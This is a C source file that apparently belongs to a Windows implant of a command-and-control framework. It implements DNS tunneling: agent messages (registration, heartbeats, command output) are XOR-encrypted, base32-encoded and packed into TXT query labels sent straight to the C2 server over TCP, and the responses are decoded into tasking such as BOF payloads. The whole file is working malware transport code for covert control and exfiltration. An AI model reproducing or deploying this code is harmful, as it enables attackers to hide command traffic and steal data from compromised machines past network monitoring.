/*
 * dns.c - Raw UDP DNS TXT query transport
 *
 * Sends XOR'd + base32-encoded payloads as DNS TXT queries to the C2
 * server directly (bypassing system resolver).  Parses TXT answers and
 * returns the decrypted response.
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "dns.h"
#include "protocol.h"
#include "config.h"

/* Maximum DNS wire-format packet we will ever send or receive.
 * BOF responses are base32-encoded; a 10 KB BOF produces ~16 KB on the wire. */
#define DNS_BUF_SIZE 65536

/* -----------------------------------------------------------------------
 * DNS name encoding: "abc.def.c2.lab" -> \x03abc\x03def\x02c2\x03lab\x00
 * dst must be large enough (max 253+2 bytes for a full domain name).
 * Returns the number of bytes written.
 * ---------------------------------------------------------------------- */
static int encode_dns_name(const char *name, uint8_t *dst, int dst_size) {
    int total = 0;
    const char *p = name;

    while (*p) {
        const char *dot = strchr(p, '.');
        int label_len;
        if (dot) {
            label_len = (int)(dot - p);
        } else {
            label_len = (int)strlen(p);
        }
        if (label_len > 63 || total + label_len + 1 + 1 >= dst_size) return -1;
        dst[total++] = (uint8_t)label_len;
        memcpy(dst + total, p, label_len);
        total += label_len;
        if (dot) {
            p = dot + 1;
        } else {
            break;
        }
    }
    dst[total++] = 0x00; /* root label */
    return total;
}

/* -----------------------------------------------------------------------
 * Skip a DNS name in a response packet (handles pointer compression).
 * buf      = full DNS response buffer
 * buf_len  = length of buf
 * offset   = current offset of the name
 * Returns the offset of the byte AFTER the name, or -1 on error.
 * ---------------------------------------------------------------------- */
static int skip_dns_name(const uint8_t *buf, int buf_len, int offset) {
    int jumps = 0;
    int first_non_pointer = -1;

    while (offset < buf_len) {
        uint8_t len = buf[offset];

        if (len == 0) {
            /* root label - end of name */
            if (first_non_pointer == -1) first_non_pointer = offset + 1;
            return first_non_pointer;
        }

        if ((len & 0xC0) == 0xC0) {
            /* pointer compression */
            if (offset + 1 >= buf_len) return -1;
            if (first_non_pointer == -1) first_non_pointer = offset + 2;
            offset = ((int)(len & 0x3F) << 8) | buf[offset + 1];
            if (++jumps > 10) return -1; /* guard against loops */
            continue;
        }

        /* normal label */
        offset += 1 + len;
    }
    return -1;
}

/* -----------------------------------------------------------------------
 * Build and send a DNS TXT query, parse the response.
 *
 * payload/payload_len : raw upstream data (already the inner data field)
 * msg_type            : MSG_REGISTER / MSG_HEARTBEAT / MSG_OUTPUT
 * seq                 : sequence number
 *
 * Returns heap-allocated buffer [resp_type(1)][data_len LE(2)][data(N)]
 * or NULL on error.  *out_len is set to the buffer size.
 * ---------------------------------------------------------------------- */
uint8_t *dns_query(const uint8_t *payload, size_t payload_len,
                   uint8_t msg_type, uint8_t seq,
                   size_t *out_len)
{
    /* ---- 1. Build upstream envelope ---- */
    size_t   pkt_len = 4 + payload_len;
    uint8_t *pkt     = (uint8_t *)malloc(pkt_len);
    if (!pkt) return NULL;

    pkt[0] = msg_type;
    pkt[1] = seq;
    write_u16le(pkt + 2, (uint16_t)payload_len);
    if (payload_len > 0) memcpy(pkt + 4, payload, payload_len);

    /* ---- 2. XOR-encrypt ---- */
    xor_crypt(pkt, pkt_len);

    /* ---- 3. Base32-encode ---- */
    size_t b32_max = ((pkt_len * 8 + 4) / 5) + 2;
    char  *b32     = (char *)malloc(b32_max);
    if (!b32) { free(pkt); return NULL; }

    int b32_len = base32_encode(pkt, pkt_len, b32, b32_max);
    free(pkt);
    if (b32_len < 0) { free(b32); return NULL; }

    /* ---- 4. Split into 63-char labels (max 3) ---- */
    /* Total domain name budget: 3 labels * 63 chars + AGENT_ID label + domain */
    char query_name[512];
    int  qn_off = 0;
    int  b32_off = 0;
    int  labels  = 0;

    while (b32_off < b32_len && labels < 3) {
        int chunk = b32_len - b32_off;
        if (chunk > 63) chunk = 63;

        if (qn_off > 0) query_name[qn_off++] = '.';
        memcpy(query_name + qn_off, b32 + b32_off, chunk);
        qn_off  += chunk;
        b32_off += chunk;
        labels++;
    }
    free(b32);

    /* Append .g_agent_id.C2_DOMAIN */
    qn_off += snprintf(query_name + qn_off,
                       sizeof(query_name) - qn_off,
                       "%s%s.%s",
                       qn_off > 0 ? "." : "",
                       g_agent_id, C2_DOMAIN);
    query_name[qn_off] = '\0';

    /* ---- 5. Build raw DNS query packet ---- */
    uint8_t dns_pkt[DNS_BUF_SIZE];
    int     dns_off = 0;

    /* Transaction ID (random) */
    uint16_t txid = (uint16_t)(rand() & 0xFFFF);
    dns_pkt[dns_off++] = (uint8_t)(txid >> 8);
    dns_pkt[dns_off++] = (uint8_t)(txid & 0xFF);

    /* Flags: 0x0100 = standard recursive query */
    dns_pkt[dns_off++] = 0x01;
    dns_pkt[dns_off++] = 0x00;

    /* QDCOUNT = 1 */
    dns_pkt[dns_off++] = 0x00;
    dns_pkt[dns_off++] = 0x01;

    /* ANCOUNT, NSCOUNT, ARCOUNT = 0 */
    dns_pkt[dns_off++] = 0x00; dns_pkt[dns_off++] = 0x00;
    dns_pkt[dns_off++] = 0x00; dns_pkt[dns_off++] = 0x00;
    dns_pkt[dns_off++] = 0x00; dns_pkt[dns_off++] = 0x00;

    /* Question: encoded name */
    int name_bytes = encode_dns_name(query_name,
                                     dns_pkt + dns_off,
                                     (int)(sizeof(dns_pkt) - dns_off - 4));
    if (name_bytes < 0) return NULL;
    dns_off += name_bytes;

    /* QTYPE = TXT (16) */
    dns_pkt[dns_off++] = 0x00;
    dns_pkt[dns_off++] = 0x10;

    /* QCLASS = IN (1) */
    dns_pkt[dns_off++] = 0x00;
    dns_pkt[dns_off++] = 0x01;

    /* ---- 6. Send query over TCP (avoids UDP fragmentation on large responses) ---- */
    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family      = AF_INET;
    srv.sin_port        = htons(C2_PORT);
    srv.sin_addr.s_addr = inet_addr(C2_HOST);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return NULL;

    DWORD timeout_ms = 8000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout_ms, sizeof(timeout_ms));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout_ms, sizeof(timeout_ms));

    if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) != 0) {
        closesocket(sock);
        return NULL;
    }

    /* DNS-over-TCP: 2-byte big-endian length prefix before the query */
    uint8_t tcp_len_hdr[2];
    tcp_len_hdr[0] = (uint8_t)((dns_off >> 8) & 0xFF);
    tcp_len_hdr[1] = (uint8_t)(dns_off & 0xFF);

    if (send(sock, (const char *)tcp_len_hdr, 2, 0) != 2 ||
        send(sock, (const char *)dns_pkt, dns_off, 0) != dns_off) {
        closesocket(sock);
        return NULL;
    }

    /* ---- 7. Receive DNS-over-TCP response (2-byte length prefix + body) ---- */
    uint8_t resp_buf[DNS_BUF_SIZE];
    uint8_t rlen_hdr[2];
    int got = 0;
    while (got < 2) {
        int n = recv(sock, (char *)(rlen_hdr + got), 2 - got, 0);
        if (n <= 0) { closesocket(sock); return NULL; }
        got += n;
    }
    int resp_len = ((int)rlen_hdr[0] << 8) | (int)rlen_hdr[1];
    if (resp_len < 12 || resp_len > (int)sizeof(resp_buf)) {
        closesocket(sock);
        return NULL;
    }

    got = 0;
    while (got < resp_len) {
        int n = recv(sock, (char *)(resp_buf + got), resp_len - got, 0);
        if (n <= 0) { closesocket(sock); return NULL; }
        got += n;
    }
    closesocket(sock);

    /* Verify transaction ID */
    uint16_t resp_txid = ((uint16_t)resp_buf[0] << 8) | resp_buf[1];
    if (resp_txid != txid) return NULL;

    /* Check QR bit (must be response) and RCODE (must be 0) */
    if (!(resp_buf[2] & 0x80)) return NULL;
    if ((resp_buf[3] & 0x0F) != 0) return NULL;

    uint16_t ancount = ((uint16_t)resp_buf[6] << 8) | resp_buf[7];
    if (ancount == 0) return NULL;

    /* ---- 8. Skip question section ---- */
    int roff = 12;
    uint16_t qdcount = ((uint16_t)resp_buf[4] << 8) | resp_buf[5];
    for (int q = 0; q < (int)qdcount; q++) {
        roff = skip_dns_name(resp_buf, resp_len, roff);
        if (roff < 0) return NULL;
        roff += 4; /* QTYPE + QCLASS */
    }

    /* ---- 9. Parse answer records, collect TXT strings ---- */
    /* Heap-allocate: TXT content can be as large as the full receive buffer */
    uint8_t *txt_raw = (uint8_t *)malloc((size_t)resp_len);
    int      txt_raw_len = 0;
    if (!txt_raw) { return NULL; }

    for (int a = 0; a < (int)ancount; a++) {
        if (roff + 10 > resp_len) break;

        /* Skip resource record name */
        roff = skip_dns_name(resp_buf, resp_len, roff);
        if (roff < 0) break;

        if (roff + 10 > resp_len) break;

        uint16_t rtype   = ((uint16_t)resp_buf[roff]   << 8) | resp_buf[roff+1];
        /* uint16_t rclass = ((uint16_t)resp_buf[roff+2] << 8) | resp_buf[roff+3]; */
        /* uint32_t rttl   = ... */
        uint16_t rdlen   = ((uint16_t)resp_buf[roff+8] << 8) | resp_buf[roff+9];
        roff += 10;

        if (roff + rdlen > resp_len) break;

        if (rtype == 16) { /* TXT */
            /* RDATA: one or more [1-byte len][string bytes] */
            int rd_off = roff;
            int rd_end = roff + (int)rdlen;

            while (rd_off < rd_end) {
                uint8_t slen = resp_buf[rd_off++];
                if (rd_off + slen > rd_end) break;
                if (txt_raw_len + (int)slen <= resp_len) {
                    memcpy(txt_raw + txt_raw_len, resp_buf + rd_off, slen);
                    txt_raw_len += (int)slen;
                }
                rd_off += slen;
            }
        }

        roff += rdlen;
    }

    if (txt_raw_len == 0) { free(txt_raw); return NULL; }

    /* ---- 10. Base32-decode TXT data ---- */
    size_t  dec_max  = (((size_t)txt_raw_len * 5) / 8) + 4;
    uint8_t *decoded = (uint8_t *)malloc(dec_max);
    if (!decoded) { free(txt_raw); return NULL; }

    int dec_len = base32_decode((const char *)txt_raw, (size_t)txt_raw_len,
                                decoded, dec_max);
    free(txt_raw);
    if (dec_len < 3) {
        free(decoded);
        return NULL;
    }

    /* ---- 11. XOR-decrypt ---- */
    xor_crypt(decoded, (size_t)dec_len);

    /* Return raw decrypted bytes: [resp_type(1)][data_len LE(2)][data(N)] */
    *out_len = (size_t)dec_len;
    return decoded;
}
